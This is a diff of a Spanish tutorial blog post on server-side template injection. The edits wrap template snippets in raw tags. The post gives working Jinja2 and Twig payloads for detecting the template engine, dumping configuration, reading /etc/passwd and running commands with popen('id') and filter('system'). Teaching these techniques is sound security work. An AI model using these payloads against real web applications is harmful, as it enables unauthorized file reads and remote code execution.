@@ -284,9 +284,11 @@ Los valores se proporcionan como pares clave-valor, lo que permite al motor de p
 
 La sintaxis de la plantilla depende del motor de plantillas concreto que se utilice. Por ejemplo para el motor de renderizado Jinja las expresiones son como la siguiente:
 
+{% raw %}
 ```jinja2
 Hello {{ name }}!
 ```
+{% endraw %}
 
 Contiene una única variable llamada name, que se sustituye por un valor dinámico durante la representación. Cuando se representa la plantilla, se debe proporcionar al motor de plantillas un valor para la variable name. Por ejemplo, si proporcionamos la variable name="test" a la función de representación, el motor de plantillas generará la siguiente cadena:
 
@@ -298,11 +300,13 @@ Como podemos ver, el motor de plantillas simplemente sustituye la variable de la
 
 Aunque el ejemplo anterior es muy sencillo, muchos motores de plantillas modernos admiten operaciones más complejas que suelen ofrecer los lenguajes de programación, como condiciones y bucles. Por ejemplo:
 
+{% raw %}
 ```jinja2
 {% for name in names %}
 Hello {{ name }}!
 {% endfor %}
 ```
+{% endraw %}
 
 La plantilla contiene un bucle «for» que recorre todos los elementos de una variable llamada «names». Por lo tanto, debemos proporcionar a la función de renderizado un objeto en la variable «names» sobre el que pueda iterar. Por ejemplo, si pasamos a la función una lista como «names=[«test», “test2”, «test3»]», el motor de plantillas generará la cadena:
 
@@ -348,15 +352,15 @@ Para comprobar si existe una vulnerabilidad SSTI, podemos inyectar la cadena de 
 
 Comenzaremos inyectando el payload `${7*7}` y seguiremos el diagrama de izquierda a derecha, dependiendo del resultado de la inyección. 
 
-Al inyectar la carga útil `${7*7}`, se produce el siguiente comportamiento:
+Al inyectar `${7*7}`, se produce el siguiente comportamiento:
 
 ![Pasted image 20260205201629](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205201629.png)
 
-Dado que no se ejecutó, seguimos la flecha roja e inyectamos ahora la carga útil `{{7*7}}`:
+Dado que no se ejecutó, seguimos la flecha roja e inyectamos {% raw %}`{{7*7}}`{% endraw %}:
 
 ![Pasted image 20260205201721](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205201721.png)
 
-En esta ocasión, fue ejecutado por el motor de plantillas. Por lo tanto, seguimos la flecha verde e inyectamos `{{7*“7”}}`. El resultado nos permitirá deducir el motor de plantillas utilizado por la aplicación web. En Jinja, el resultado será 7777777, mientras que en Twig, el resultado será 49.
+En esta ocasión, fue ejecutado por el motor de plantillas. Por lo tanto, seguimos la flecha verde e inyectamos {% raw %}`{{7*"7"}}`{% endraw %}. El resultado nos permitirá deducir el motor de plantillas utilizado por la aplicación web. En Jinja, el resultado será 7777777, mientras que en Twig, el resultado será 49.
 
 ### Explotando Jinja2
 
@@ -368,9 +372,11 @@ En nuestro payload, podemos utilizar libremente cualquier biblioteca que ya haya
 
 Podemos aprovechar la vulnerabilidad SSTI para obtener información interna sobre la aplicación web, incluidos los detalles de configuración y el código fuente de la aplicación web. Por ejemplo, podemos obtener la configuración de la aplicación web utilizando:
 
+{% raw %}
 ```jinja2
 {{ config.items() }}
 ```
+{% endraw %}
 
 ![Pasted image 20260205203044](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203044.png)
 
@@ -378,9 +384,11 @@ Dado que vuelca toda la configuración de la aplicación web, incluidas las clav
 
 Podemos utilizar el siguiente payload para volcar todas las funciones integradas disponibles:
 
+{% raw %}
 ```jinja2
 {{ self.__init__.__globals__.__builtins__ }}
 ```
+{% endraw %}
 
 ![Pasted image 20260205203151](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203151.png)
 
@@ -389,9 +397,11 @@ Podemos utilizar el siguiente payload para volcar todas las funciones integradas
 Podemos utilizar la función integrada open de Python para incluir un archivo local. Sin embargo, no podemos llamar a la función directamente; tenemos que llamarla desde el diccionario __builtins__ que hemos volcado anteriormente.
 Esto da como resultado el siguiente payload para incluir el archivo /etc/passwd:
 
+{% raw %}
 ```jinja2
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
+{% endraw %}
 
 ![Pasted image 20260205203304](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203304.png)
 
@@ -399,9 +409,11 @@ Esto da como resultado el siguiente payload para incluir el archivo /etc/passwd:
 
 Para lograr la ejecución remota de código en Python, podemos utilizar funciones proporcionadas por la biblioteca os, como system o popen. Sin embargo, si la aplicación web aún no ha importado esta biblioteca, primero debemos importarla llamando a la función integrada import. 
 
+{% raw %}
 ```jinja2
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
+{% endraw %}
 
 ![Pasted image 20260205203348](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203348.png)
 
@@ -411,11 +423,13 @@ Twig es un motor de plantillas para el lenguaje de programación PHP.
 
 #### Information Disclosure
 
-En Twig, podemos usar la palabra clave `{{ _self }}` para obtener un poco de información sobre la plantilla actual:
+En Twig, podemos usar la palabra clave {% raw %}`{{ _self }}`{% endraw %} para obtener un poco de información sobre la plantilla actual:
 
+{% raw %}
 ```twig
 {{ _self }}
 ```
+{% endraw %}
 
 ![Pasted image 20260205204305](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205204305.png)
 
@@ -423,9 +437,11 @@ En Twig, podemos usar la palabra clave `{{ _self }}` para obtener un poco de inf
 
 Leer archivos locales (sin utilizar el mismo método que utilizaremos para RCE) no es posible utilizando las funciones internas proporcionadas directamente por Twig. Sin embargo, el marco web PHP Symfony define filtros Twig adicionales. Uno de estos filtros es file_excerpt y se puede utilizar para leer archivos locales:
 
+{% raw %}
 ```twig
 {{ "/etc/passwd"|file_excerpt(1,-1) }}
 ```
+{% endraw %}
 
 ![Pasted image 20260205205529](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205205529.png)
 
@@ -433,9 +449,11 @@ Leer archivos locales (sin utilizar el mismo método que utilizaremos para RCE) 
 
 Para lograr la ejecución remota de código, podemos utilizar una función integrada en PHP, como system. Podemos pasar un argumento a esta función utilizando la función de filtro de Twig, lo que da como resultado:
 
+{% raw %}
 ```twig
 {{ ['id'] | filter('system') }}
 ```
+{% endraw %}
 
 ![Pasted image 20260205205604](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205205604.png)
 
